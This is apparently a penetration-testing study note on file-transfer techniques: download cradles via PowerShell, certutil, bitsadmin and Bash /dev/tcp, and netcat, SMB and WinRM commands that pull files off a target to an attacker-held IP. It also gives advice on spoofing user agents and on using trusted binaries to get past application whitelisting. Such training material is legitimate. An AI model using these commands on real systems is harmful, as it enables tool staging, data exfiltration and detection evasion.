---
tags: [file-transfers, summary, core, must-know]
---

# File Transfers - What You MUST FUCKING KNOW

## The Absolute Essentials

If you learn NOTHING else from this module, learn these 10 things. Everything else is optimization and edge cases.

---

## 1. The Golden Rule of File Transfers

> "Always have multiple methods ready. One WILL fail."

In every engagement, something will be blocked:
- PowerShell might be disabled
- Port 445 might be firewalled
- GitHub might be blocked
- Certutil might be monitored

**The Rule:** If you only know one method, you'll get stuck. Know ten.

---

## 2. Windows Downloads - The Big Three

| Method | Command |
|--------|---------|
| PowerShell | (New-Object Net.WebClient).DownloadFile('http://server/file', 'file') |
| Certutil | certutil -urlcache -f http://server/file file |
| Bitsadmin | bitsadmin /transfer job /download /priority high http://server/file C:\file |

**Memory Trick:** "PowerShell, Certutil, Bitsadmin" - always try these three first on Windows.

---

## 3. Linux Downloads - The Big Two

| Method | Command |
|--------|---------|
| wget | wget http://server/file -O /tmp/file |
| curl | curl -o /tmp/file http://server/file |

**If wget and curl are missing:** Try Bash's /dev/tcp:

exec 3<>/dev/tcp/server/80
echo -e "GET /file HTTP/1.1\n\n" >&3
cat <&3 > file

---

## 4. Base64 - When Network Transfers Fail

When you can't make network connections, use text-only channels.

**On Linux (encode):**
base64 -w0 file

**On Windows (encode):**
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file"))

**On Linux (decode):**
echo "base64string" | base64 -d > file

**On Windows (decode):**
[IO.File]::WriteAllBytes("file", [Convert]::FromBase64String("base64string"))

**The Rule:** Base64 works everywhere, always.

---

## 5. SMB - The Windows Favorite

Set up an SMB server on Linux:

sudo impacket-smbserver share /tmp/smbshare -smb2support

On Windows target:

copy \\YOUR-IP\share\file.exe C:\temp\

**If guest access blocked:**

sudo impacket-smbserver share /tmp/smbshare -user test -password test
net use \\YOUR-IP\share /user:test test
copy \\YOUR-IP\share\file.exe C:\temp\

---

## 6. Netcat - The Universal Fallback

**Receive file (on your machine):**
nc -lvnp 4444 > received_file

**Send file (from target):**
nc -q 0 YOUR-IP 4444 < file_to_send

**If Netcat missing on target, use Bash:**
cat < /dev/tcp/YOUR-IP/4444 > received_file

**The Rule:** Netcat works when nothing else does.

---

## 7. PowerShell Remoting (WinRM)

When HTTP/SMB/FTP are blocked, try WinRM.

Check if port 5985 is open:
Test-NetConnection -ComputerName TARGET -Port 5985

Create session:
$Session = New-PSSession -ComputerName TARGET

Copy file to target:
Copy-Item -Path C:\local.txt -ToSession $Session -Destination C:\remote.txt

Copy file from target:
Copy-Item -Path C:\remote.txt -Destination C:\local.txt -FromSession $Session

---

## 8. Living Off the Land - The Stealth Option

**LOLBAS (Windows):** https://lolbas-project.github.io/
**GTFOBins (Linux):** https://gtfobins.github.io/

Example: GfxDownloadWrapper.exe (Intel graphics driver)
GfxDownloadWrapper.exe "http://server/file.exe" "C:\Temp\file.exe"

**The Rule:** Trusted binaries bypass application whitelisting.

---

## 9. User Agents - The Detection Evasion

Default PowerShell user agent gets flagged. Change it:

$ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest -Uri http://server/file.exe -UserAgent $ua -OutFile file.exe

**The Rule:** Look like Chrome, not PowerShell.

---

## 10. Encryption - Protect Your Data

**NEVER** transfer sensitive data in plaintext.

Linux:
openssl enc -aes256 -pbkdf2 -in file -out file.enc

Windows (using Invoke-AESEncryption.ps1):
Invoke-AESEncryption -Mode Encrypt -Key "StrongUniquePassword" -Path file

**The Rule:** If it's sensitive, encrypt it. Every time.

---

## The One-Liners You MUST Know

### Windows Download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://server/file', 'file')"

### Windows Upload
powershell -c "(New-Object Net.WebClient).UploadFile('ftp://server/file', 'C:\file')"

### Linux Download
wget http://server/file -O /tmp/file

### Linux Upload
curl -T /tmp/file http://server/upload

### Base64 Encode
base64 -w0 file

### Base64 Decode
base64 -d file > file

### Netcat Receive
nc -lvnp 4444 > file

### Netcat Send
nc -q 0 server 4444 < file

### SMB Server (Linux)
sudo impacket-smbserver share . -smb2support

### SMB Client (Windows)
copy \\server\share\file .

---

## The Golden Rule

> "You can't escalate privileges if you can't transfer tools."

- File transfer is NOT optional - it's mandatory
- If you can't move files, you can't do anything
- Practice until it's muscle memory
- The more methods you know, the less likely you'll get stuck

**Now go transfer some fucking files.**
